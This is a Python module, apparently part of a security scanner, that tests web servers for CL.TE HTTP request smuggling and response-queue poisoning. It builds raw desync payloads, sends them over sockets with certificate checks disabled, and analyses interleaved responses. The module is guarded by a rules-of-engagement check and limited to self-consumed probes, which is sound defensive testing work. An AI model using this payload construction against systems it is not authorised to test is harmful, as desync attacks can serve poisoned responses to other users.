"""Self-only response-queue poisoning proof (Tier-3 §1.2).

We inject a desync prefix that queues a response with a unique proof
marker, then send our OWN next request with the same marker in a header.
If the queued response arrives before our expected one, the queue was
poisoned. This never lets another user be served the poisoned response:
the poison is self-consumed within one connection, bounded to 3 rounds.

Integration testing (loopback fixture) is deferred — the mechanism is
timing-sensitive and would flake in CI. Unit tests cover payload
construction and the analyze function.
"""
from __future__ import annotations

import hashlib
import os
import socket
import ssl
import time
from urllib.parse import urlparse

from ..config import load_engine
from ..roe_guard import ROEGuard, ROEViolation


MAX_ROUNDS = 3


def _verify_tls():
    try:
        cfg = load_engine() or {}
        return bool(cfg.get("http", {}).get("verify_tls", True))
    except Exception:
        return False


def _roe_block(guard, url, method="POST"):
    if guard is None:
        try:
            guard = ROEGuard(engine_cfg=load_engine())
        except Exception as e:
            return "ROE guard unavailable (fail-closed): %s" % e
    try:
        guard.check_url(url, method)
        return None
    except ROEViolation as e:
        return str(e)


def _new_marker():
    return "qp-" + hashlib.sha256(os.urandom(8)).hexdigest()[:16]


def build_poison_prefix(url, marker, smuggled_path="/queue-poison-probe"):
    """Build a CL.TE prefix whose smuggled request carries X-Queue-Proof.

    The prefix request declares CL matching the length of `0\\r\\n\\r\\n` +
    smuggled; backend that honours TE parses the smuggled as the next
    request and responds with the marker echoed back.
    """
    parsed = urlparse(url)
    host = parsed.hostname or ""
    port = parsed.port
    authority = host if not port else "%s:%d" % (host, port)
    smuggled = (
        "GET %s HTTP/1.1\r\nHost: %s\r\nX-Queue-Proof: %s\r\n\r\n"
        % (smuggled_path, authority, marker)
    ).encode("latin-1")
    prefix_body = b"0\r\n\r\n" + smuggled
    prefix = (
        "POST %s HTTP/1.1\r\n" % (parsed.path or "/")
        + "Host: %s\r\n" % authority
        + "Content-Length: %d\r\n" % len(prefix_body)
        + "Transfer-Encoding: chunked\r\n"
        + "Connection: keep-alive\r\n\r\n"
    ).encode("latin-1") + prefix_body
    return prefix


def build_victim_request(url, marker):
    """Build a normal request carrying the same marker as a client header."""
    parsed = urlparse(url)
    host = parsed.hostname or ""
    port = parsed.port
    authority = host if not port else "%s:%d" % (host, port)
    req = (
        "GET %s HTTP/1.1\r\n" % (parsed.path or "/")
        + "Host: %s\r\n" % authority
        + "X-Queue-Proof-Client: %s\r\n" % marker
        + "Connection: close\r\n\r\n"
    ).encode("latin-1")
    return req


def _split_responses(raw):
    responses = []
    buf = raw
    while buf:
        if b"\r\n\r\n" not in buf:
            break
        head, _, rest = buf.partition(b"\r\n\r\n")
        cl = None
        for line in head.split(b"\r\n")[1:]:
            if line.lower().startswith(b"content-length:"):
                try:
                    cl = int(line.split(b":", 1)[1].strip())
                except (ValueError, IndexError):
                    cl = None
                break
        if cl is None:
            responses.append({"headers_raw": head, "body_raw": rest})
            break
        if len(rest) < cl:
            responses.append({"headers_raw": head, "body_raw": rest})
            break
        responses.append({"headers_raw": head, "body_raw": rest[:cl]})
        buf = rest[cl:]
    return responses


def _analyze_queue_response(reads, expected_marker, expected_normal_body):
    """Decide whether the queue was poisoned.

    reads: list of {headers_raw, body_raw} dicts (bytes)
    expected_marker: the marker we injected
    expected_normal_body: substring we expect in our own victim response
    """
    marker_b = expected_marker.encode() if isinstance(expected_marker, str) \
        else expected_marker
    normal_b = (expected_normal_body.encode()
                if isinstance(expected_normal_body, str)
                else expected_normal_body)
    for i, resp in enumerate(reads):
        head = resp.get("headers_raw") or b""
        body = resp.get("body_raw") or b""
        has_marker = marker_b in head or marker_b in body
        if not has_marker:
            continue
        # Marker present in response i — was this response expected
        # (our victim's own) or a poisoned injection?
        is_expected = bool(normal_b) and (normal_b in head or normal_b in body)
        if not is_expected:
            return {
                "poisoned": True,
                "reason": "queue-proof marker appeared in response %d "
                          "(not the victim's own response)" % i,
                "marker_response_index": i,
            }
    return {"poisoned": False, "reason": "marker never interleaved"}


def probe(url, timeout=6, roe_guard=None, max_rounds=MAX_ROUNDS,
           expected_normal_body="ok"):
    """Send self-poisoned prefix + victim request; detect interleaving."""
    viol = _roe_block(roe_guard, url, "POST")
    if viol:
        return {"verdict": "UNKNOWN", "reason": "ROE_BLOCK: " + viol,
                "evidence": {}}
    parsed = urlparse(url)
    host = parsed.hostname or ""
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    use_tls = parsed.scheme == "https"
    rounds = 0
    attempts = []
    for _ in range(max_rounds):
        rounds += 1
        marker = _new_marker()
        try:
            poison = build_poison_prefix(url, marker)
            victim = build_victim_request(url, marker)
        except Exception as e:
            attempts.append({"error": "%s: %s" % (type(e).__name__, e)})
            continue
        try:
            sock = socket.create_connection((host, port), timeout=timeout)
            if use_tls:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)
        except Exception as e:
            attempts.append({"error": "%s: %s" % (type(e).__name__, e)})
            continue
        try:
            sock.sendall(poison)
            sock.sendall(victim)
            sock.settimeout(timeout)
            data = b""
            deadline = time.monotonic() + timeout
            while len(data) < 200000 and time.monotonic() < deadline:
                try:
                    chunk = sock.recv(8192)
                except socket.timeout:
                    break
                if not chunk:
                    break
                data += chunk
        finally:
            try:
                sock.close()
            except Exception:
                pass
        reads = _split_responses(data)
        result = _analyze_queue_response(reads, marker,
                                          expected_normal_body)
        attempts.append({
            "marker": marker,
            "response_count": len(reads),
            "poisoned": result["poisoned"],
            "reason": result["reason"],
        })
        if result["poisoned"]:
            return {
                "verdict": "VULNERABLE",
                "reason": ("queue poisoned: %s (round %d)"
                           % (result["reason"], rounds)),
                "evidence": {"attempts": attempts},
                "queue_poisoned": True,
            }
    return {
        "verdict": "PASS",
        "reason": "no queue-poison marker interleaved across %d round(s)"
                  % rounds,
        "evidence": {"attempts": attempts},
        "queue_poisoned": False,
    }
